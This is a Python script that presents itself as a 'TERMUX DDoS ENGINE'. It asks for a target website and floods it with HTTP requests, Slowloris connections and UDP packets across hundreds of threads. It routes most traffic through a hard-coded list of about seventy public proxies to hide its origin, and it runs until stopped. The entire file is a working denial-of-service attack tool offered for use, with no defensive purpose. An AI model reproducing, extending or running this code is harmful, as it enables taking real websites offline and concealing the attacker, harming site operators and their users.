import socket
import random
import threading
import time
import ssl
import os
import sys
from urllib.parse import urlparse
from datetime import datetime

# ---------- GLOBALS ----------
TOTAL_REQUESTS = 0
TOTAL_DATA = 0
ACTIVE_THREADS = 0
START_TIME = time.time()
LOCK = threading.Lock()
STOP_FLAG = False

# ---------- AUTO POWER DETECTION (No psutil) ----------
def detect_power():
    """Termux-friendly power detection"""
    try:
        # Read CPU info from /proc
        with open('/proc/cpuinfo', 'r') as f:
            cpu_info = f.read()
            cores = cpu_info.count('processor')
        
        # Read RAM info from /proc/meminfo
        with open('/proc/meminfo', 'r') as f:
            mem_info = f.read()
            mem_total = int(mem_info.split('MemTotal:')[1].split()[0]) / 1024  # MB
        
        if mem_total < 2048:
            return 200
        elif mem_total < 4096:
            return 400
        else:
            return min(cores * 50, 800)  # Max 800 threads
    except:
        return 500  # Default safe value

MAX_THREADS = detect_power()
print(f"⚡ Auto-detected max threads: {MAX_THREADS}")

# ---------- PROXY LIST (Free + Working) ----------
PROXY_LIST = [
    "http://188.165.199.207:80",
    "http://37.27.6.46:80",
    "http://138.91.159.185:80",
    "http://170.106.173.62:8080",
    "http://152.230.215.123:80",
    "http://12.50.107.222:80",
    "http://139.99.237.62:80",
    "http://200.69.83.203:999",
    "http://20.27.14.220:8561",
    "http://12.50.107.219:80",
    "http://12.50.107.220:80",
    "http://175.101.240.38:80",
    "http://185.239.50.122:10808",
    "http://51.75.206.209:80",
    "http://103.65.237.92:5678",
    "http://14.225.240.23:8562",
    "http://34.94.46.8:80",
    "http://178.250.156.112:443",
    "http://165.138.86.202:8080",
    "http://164.52.11.194:18080",
    "http://212.113.104.29:10801",
    "http://95.140.154.156:1080",
    "http://143.198.135.176:80",
    "http://91.234.96.45:9001",
    "http://94.232.44.246:10808",
    "http://8.212.168.170:443",
    "http://176.12.65.24:443",
    "http://47.80.26.236:8080",
    "http://129.226.72.101:18080",
    "http://175.139.233.79:80",
    "http://139.28.241.247:1081",
    "http://146.59.16.47:8888",
    "http://87.228.89.21:80",
    "http://8.215.112.34:7777",
    "http://81.90.29.194:10808",
    "http://197.221.249.197:80",
    "http://165.154.7.156:8888",
    "http://162.240.19.30:80",
    "http://20.27.15.111:8561",
    "http://64.112.184.210:3128",
    "http://103.82.20.76:8080",
    "http://103.167.88.210:8888",
    "http://154.203.132.81:1080",
    "http://109.120.184.202:1080",
    "http://139.99.95.120:8080",
    "http://91.142.75.202:1080",
    "http://34.134.231.117:3129",
    "http://34.96.238.40:8080",
    "http://212.47.232.28:80",
    "http://41.184.92.220:80",
    "http://197.221.240.247:80",
    "http://41.220.16.208:80",
    "http://197.221.234.253:80",
    "http://219.65.73.80:80",
    "http://27.34.242.98:80",
    "http://34.44.49.215:80",
    "http://181.16.201.37:80",
    "http://5.45.126.128:8080",
    "http://187.62.191.3:61456",
    "http://47.238.134.126:81",
    "http://103.151.20.131:80",
    "http://172.237.73.24:80",
    "http://167.99.236.14:80",
    "http://194.150.110.134:80",
    "http://175.139.233.76:80",
    "http://143.42.66.91:80",
    "http://203.175.126.229:8000",
    "http://154.117.154.194:8080",
    "http://185.85.111.18:80"
]

def get_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ---------- ATTACK METHODS (With Proxy Support) ----------
def http_flood(proxy):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        if proxy:
            proxy_parts = proxy.replace('http://', '').split(':')
            proxy_host = proxy_parts[0]
            proxy_port = int(proxy_parts[1])
            sock.connect((proxy_host, proxy_port))
            # HTTP CONNECT method
            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            sock.send(connect_req.encode())
            sock.recv(1024)  # Read response
        else:
            sock.connect((host, port))
        
        if port == 443 and not proxy:  # HTTPS without proxy
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        
        # Random headers for each request
        headers = [
            f"GET {path}?{random.randint(1,999999)} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {random.choice(['Mozilla/5.0','Chrome/120','Firefox/121','Edge/118'])}",
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.9",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        ]
        request = "\r\n".join(headers) + "\r\n\r\n"
        sock.send(request.encode())
        sock.close()
        
        with LOCK:
            TOTAL_REQUESTS += 1
            TOTAL_DATA += len(request)
    except:
        pass

def slowloris(proxy):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        if proxy:
            proxy_parts = proxy.replace('http://', '').split(':')
            proxy_host = proxy_parts[0]
            proxy_port = int(proxy_parts[1])
            sock.connect((proxy_host, proxy_port))
            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            sock.send(connect_req.encode())
            sock.recv(1024)
        else:
            sock.connect((host, port))
        
        sock.send(f"GET {path} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {host}\r\n".encode())
        # Keep connection alive with random headers
        for _ in range(30):
            sock.send(f"X-Header: {random.randint(1,99999)}\r\n".encode())
            time.sleep(0.1)
        sock.close()
        
        with LOCK:
            TOTAL_REQUESTS += 1
            TOTAL_DATA += 500
    except:
        pass

def udp_flood(proxy=None):
    global TOTAL_REQUESTS, TOTAL_DATA
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        data = random._urandom(1024)
        target = proxy.split(':') if proxy else (host, port)
        if proxy:
            target_host = target[0].replace('http://', '')
            target_port = int(target[1])
            for _ in range(100):
                sock.sendto(data, (target_host, target_port))
        else:
            for _ in range(100):
                sock.sendto(data, (host, port))
        sock.close()
        
        with LOCK:
            TOTAL_REQUESTS += 100
            TOTAL_DATA += 102400
    except:
        pass

# ---------- ATTACK THREAD ----------
def attack_worker():
    global ACTIVE_THREADS
    with LOCK:
        ACTIVE_THREADS += 1
    
    use_proxy = random.random() > 0.3  # 70% requests use proxy
    proxy = get_proxy() if use_proxy else None
    
    while not STOP_FLAG:
        method = random.choice(["http", "http", "http", "slow", "udp"])
        if method == "http":
            http_flood(proxy)
        elif method == "slow":
            slowloris(proxy)
        else:
            udp_flood(proxy)
        time.sleep(random.uniform(0.0001, 0.002))  # Ultra speed
    
    with LOCK:
        ACTIVE_THREADS -= 1

# ---------- STATS MONITOR ----------
def stats_monitor():
    global TOTAL_REQUESTS, TOTAL_DATA
    while not STOP_FLAG:
        elapsed = time.time() - START_TIME
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        with LOCK:
            req = TOTAL_REQUESTS
            data_mb = TOTAL_DATA / (1024 * 1024)
            threads = ACTIVE_THREADS
            rate = req / elapsed if elapsed > 0 else 0
        
        print(f"\r⏱️ {hours:02d}:{minutes:02d}:{seconds:02d} | "
              f"📨 {req:,} req | "
              f"📊 {rate:.0f}/s | "
              f"📦 {data_mb:.1f} MB | "
              f"🧵 {threads} active", end="")
        
        time.sleep(0.5)

# ---------- LAUNCH ATTACK ----------
print("🔥 DEVILS WILL RISE — TERMUX DDoS ENGINE 🔥")
TARGET_URL = input("🎯 Website URL daal (with http/https): ")
parsed = urlparse(TARGET_URL)
host = parsed.netloc
path = parsed.path if parsed.path else "/"
port = 443 if parsed.scheme == "https" else 80

print(f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {host}:{port}
⚡ Threads: {MAX_THREADS}
📡 Methods: HTTP + Slowloris + UDP
🔄 Proxy: 70% requests via proxy
⚡ Mode: INFINITE (Ctrl+C to stop)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

# Start attack threads
threads = []
for i in range(MAX_THREADS):
    t = threading.Thread(target=attack_worker)
    t.daemon = True
    t.start()
    threads.append(t)
    time.sleep(0.0001)

# Start stats monitor
stats_thread = threading.Thread(target=stats_monitor)
stats_thread.daemon = True
stats_thread.start()

# Keep running until interrupt
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    STOP_FLAG = True
    print("\n\n💀 Attack stopped by user!")

# Final stats
elapsed = time.time() - START_TIME
with LOCK:
    req = TOTAL_REQUESTS
    data_gb = TOTAL_DATA / (1024**3)
    rate = req / elapsed if elapsed > 0 else 0

print(f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 FINAL STATISTICS
⏱️ Duration: {int(elapsed//3600)}h {int((elapsed%3600)//60)}m {int(elapsed%60)}s
📨 Total Requests: {req:,}
📊 Average Speed: {rate:.0f} req/s
📦 Total Data Sent: {data_gb:.2f} GB
🧵 Peak Threads: {MAX_THREADS}
🎯 Target: {host}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 DEVILS WILL RISE — Attack Complete!
""")